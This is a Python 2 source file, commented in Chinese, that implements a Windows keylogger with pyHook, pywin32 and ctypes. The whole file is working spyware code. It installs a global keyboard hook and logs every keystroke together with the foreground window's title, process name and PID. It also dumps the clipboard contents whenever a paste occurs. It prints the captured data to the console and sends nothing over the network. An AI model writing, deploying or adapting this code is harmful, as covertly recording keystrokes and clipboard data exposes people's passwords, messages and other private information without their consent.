# _*_ coding: utf-8 _*_
'''先安装pyHook和pywin32'''
# 用于监听键盘事件
from ctypes import *
import pythoncom
import pyHook
import win32clipboard

# 初始化基本参数
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
# 用来保存窗口对象
current_window = None


# 获取当前进程信息和当前窗口信息
def get_current_process():
    '''获取进程信息和当前窗口信息'''
    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID  
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 将进程ID存入变量中  
    process_id = "%d" % pid.value

    # 申请内存  
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # 读取窗口标题  
    windows_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

    # 打印
    print
    print "[ PID:%s-%s-%s]" % (process_id, executable.value, windows_title.value)
    print

    # 关闭handles  
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


# 定义键盘监听事件函数
def KeyStroke(event):
    global current_window
    # global info_list
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)  
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用,得到对应的窗口信息
        get_current_process()

    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来  
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE]-%s" % (pasted_value),
        else:
            # info_list.append("[%s]" % event.Key)
            print "[%s]" % event.Key,
            # 循环监听下一个击键事件
    return True


def main():
    # 创建并注册hook管理器
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    # 注册hook并执行
    kl.HookKeyboard()
    pythoncom.PumpMessages()


if __name__ == '__main__':
    main()
